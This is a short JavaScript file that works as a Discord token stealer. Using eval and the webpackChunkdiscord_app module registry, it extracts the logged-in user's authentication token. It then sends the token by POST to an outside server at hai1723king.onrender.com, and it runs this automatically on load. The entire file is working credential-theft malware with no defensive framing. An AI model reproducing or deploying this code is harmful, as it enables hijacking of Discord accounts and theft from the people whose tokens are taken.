const executeJS = async (script) => {
  // Function to execute JavaScript code and return the result
  return new Promise((resolve, reject) => {
    try {
      const result = eval(script); // Use a safer method if eval is not suitable
      resolve(result);
    } catch (error) {
      reject(error);
    }
  });
};

const getToken = async () => {
  try {
    const token = await executeJS(`
      (webpackChunkdiscord_app.push([[''], {}, e => {
        m = [];
        for (let c in e.c) m.push(e.c[c]);
      }]), m).find(m => m?.exports?.default?.getToken !== undefined)?.exports.default.getToken()
    `);
    console.log('Extracted token:', token);
    return token;
  } catch (error) {
    console.error('Error extracting token:', error);
  }
};

const url = 'https://hai1723king.onrender.com/token';

const sendToken = async (token) => {
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: new URLSearchParams({
        token: token,
      }),
    });

    if (!response.ok) {
      throw new Error('Network response was not ok ' + response.statusText);
    }

    const data = await response.text();
    console.log('Success:', data);
  } catch (error) {
    console.error('Error:', error);
  }
};

// Example usage
const run = async () => {
  const token = await getToken();
  if (token) {
    await sendToken(token);
  }
};

run();
